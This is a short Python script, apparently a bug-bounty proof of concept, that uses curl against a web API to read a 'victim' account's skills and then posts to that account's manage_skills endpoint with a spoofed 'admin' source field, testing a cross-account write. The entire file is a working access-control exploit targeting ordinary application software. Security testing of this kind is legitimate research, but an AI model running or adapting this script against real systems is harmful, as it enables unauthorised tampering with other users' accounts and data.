import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
# baseline: read victim 230 skills
for p in ['/api/v1/user_skills?filter[user_id][eq]=230','/api/v1/user_skills','/api/v1/skills']:
    c,b=req('GET',p)
    print(f"{c} GET {p}  {b[:200].replace(chr(10),' ')}")
# write skills onto victim 230 (cross-account)
c,b=req('POST','/api/v1/users/230/manage_skills',{"meta":{"source":"admin"},"skillIdsForCreate":[1],"skillIdsForDelete":[]})
print("\nWRITE skills -> victim 230:",c)
print("  ",b[:400].replace(chr(10),' '))
